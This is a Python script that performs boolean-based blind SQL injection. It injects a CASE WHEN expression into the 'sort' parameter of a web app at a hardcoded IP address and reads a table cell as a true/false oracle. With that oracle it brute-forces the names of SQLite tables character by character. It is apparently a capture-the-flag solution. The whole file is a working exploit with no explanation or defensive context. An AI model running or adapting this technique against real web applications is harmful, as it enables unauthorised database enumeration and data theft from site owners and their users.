import requests
import string
from bs4 import BeautifulSoup

HOST = "http://34.142.247.201/"

def oracle(command):
    payload = f"(CASE WHEN ({command}) THEN jun2021 ELSE jun2020 END)"

    resp = requests.get(HOST, params={"sort": payload})

    soup = BeautifulSoup(resp.text, 'html.parser')

    results = soup.find_all("td")
    return results[-3].get_text() == "Go"

assert oracle("1=0") is False
assert oracle("1=1") is True

buffer = ""

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + ":" 

while True:
    for character in alphabet:
        guess = buffer + character
        print("trying", guess)
        end = len(buffer) + 1
        command = f"SELECT substr(GROUP_CONCAT(name, ':'), 1, {end})='{guess}' FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'"
        if oracle(command):
            buffer = guess
            print("Found", buffer)
            break
    else:
        print("Reached End")
        break
